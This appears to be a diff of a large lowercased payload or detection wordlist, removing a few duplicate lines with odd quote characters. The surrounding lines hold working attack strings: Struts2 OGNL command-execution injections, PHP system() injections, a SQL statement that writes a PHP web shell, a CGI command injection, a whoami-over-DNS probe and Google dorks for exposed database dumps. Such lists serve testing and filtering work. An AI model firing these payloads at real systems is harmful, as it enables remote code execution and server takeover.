@@ -14,9 +14,6 @@ $(whoami)
 ${%23_memberaccess%3d%40ognl.ognlcontext%40default_member_access,%23wwww=@java.lang.runtime@getruntime(),%23ssss=new%20java.lang.string[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.injparam[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.servletactioncontext%40getresponse().getwriter()%2c%23kzxs.print(%23parameters.injparam[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.tostring}&injparam=touch%20/tmp/injectedfile.txt
 ${%23_memberaccess%3d%40ognl.ognlcontext%40default_member_access,%23wwww=@java.lang.runtime@getruntime(),%23ssss=new%20java.lang.string[3],%23ssss[0]="cmd",%23ssss[1]="%2fc",%23ssss[2]=%23parameters.injparam[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.servletactioncontext%40getresponse().getwriter()%2c%23kzxs.print(%23parameters.injparam[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.tostring}&injparam=touch%20/tmp/injectedfile.txt
 ${@print(system($_server['http_user_agent']))}
-${@print(system(â€œwhoamiâ€))}
-${@print(system(“dir”))}
-${@print(system(“whoami”))}
 ${exec(print(`echo%20aojpqw\necho%20$((18%2b92))\necho%20aojpqw\necho%20aojpqw`)%3b%25252529%2525257daojpqw
 ${exec(print(`echo%20asbmqm;echo%20$((65%2b46));echo%20asbmqm;echo%20asbmqm`)%3b%2523asbmqm
 ${exec(print(`echo%20bdbpsz;echo%20$((87%2b50));echo%20bdbpsz;echo%20bdbpsz`)%3bbdbpsz
@@ -385,7 +382,6 @@ innoedit/innoedit.cgi?download=;id|
 insert into lol.pwn (dataz) values ("<?php system($_get['cmd']); ?>");--
 intext:phpmyadmin sql dump filetype:sql intext:insert into `admin` (`id`, `user`, `password`) values -github
 inurl:"id=" & intext:"warning: pg_exec()
-inurl:”id=” & intext:”warning: pg_exec()
 iphone 5.0 (firefox/12.0 ; u; id-en) webkit/553.0 presto/1.9.95 sistem build/frf91 untrusted/1.0
 iphone 5.0 (firefox/12.0 ; u; id-en) webkit/553.0 presto/1.9.95 untrusted/1.0
 iphone/5.0 (iphone; iphone/13.0; u; id) presto/2.8.199 version/11.10 untrusted/1.0
@@ -4487,4 +4483,3 @@ zohibbrowser/1.0 (linux; u; android 4.4.2; id-id; nexus 4 build/rel) applewebkit
 ||idg.com.au/adblock/$script
 ||id||
 ||nslookup+`whoami`.localhost.com||
-“id=” & intext:”warning: pg_exec()
